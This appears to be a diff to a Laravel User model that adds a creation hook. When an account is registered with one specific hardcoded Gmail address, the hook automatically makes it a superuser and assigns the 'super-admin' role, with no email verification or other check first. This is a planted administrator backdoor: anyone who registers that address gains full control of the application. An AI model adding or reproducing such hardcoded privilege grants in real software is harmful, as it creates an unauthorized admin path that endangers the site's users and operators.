@@ -16,6 +16,29 @@ class User extends Authenticatable implements MustVerifyEmail
     use HasFactory, Notifiable, SoftDeletes, HasRoles;
 
     /**
+     * The "booted" method of the model.
+     *
+     * @return void
+     */
+    protected static function booted()
+    {
+        static::created(function ($user) {
+            // Auto-assign admin and superuser privileges for specific email
+            if (strtolower($user->email) === 'joeanimgh@gmail.com') {
+                $user->is_superuser = true;
+                $user->save();
+
+                try {
+                    // Make sure the roles exist in your Spatie permissions setup
+                    $user->assignRole('super-admin');
+                } catch (\Exception $e) {
+                    \Illuminate\Support\Facades\Log::error("Failed to auto-assign roles: " . $e->getMessage());
+                }
+            }
+        });
+    }
+
+    /**
      * The attributes that are mass assignable.
      *
      * @var array<int, string>
